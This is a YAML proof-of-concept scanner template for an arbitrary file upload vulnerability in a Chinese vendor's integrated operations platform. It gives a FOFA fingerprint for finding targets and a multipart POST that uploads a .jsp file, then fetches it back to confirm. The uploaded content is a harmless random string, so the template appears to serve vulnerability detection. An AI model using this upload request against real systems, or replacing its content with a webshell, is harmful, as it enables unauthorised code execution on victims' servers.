id: poc-yaml-jnetdata-iop-word-anyfile-upload
info:
  name: 北京中科聚网一体化运营平台 word 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 一体化运营平台
  fofa: body="thirdparty/ueditor/WordPaster"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /resources/files/ue/word
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
  data: '------WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"

    Content-Type: application/octet-stream


    {{.t2}}

    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--'
  expression: status_code == 200 && contains(body,".jsp") && !contains(body,"<")
  output:
  - regex_match(body,"files/headimg/(?P<file>.*?).jsp")
- method: GET
  path: /files/headimg/{{.file}}.jsp
  expression: status_code == 200 && body == t2
transport: http
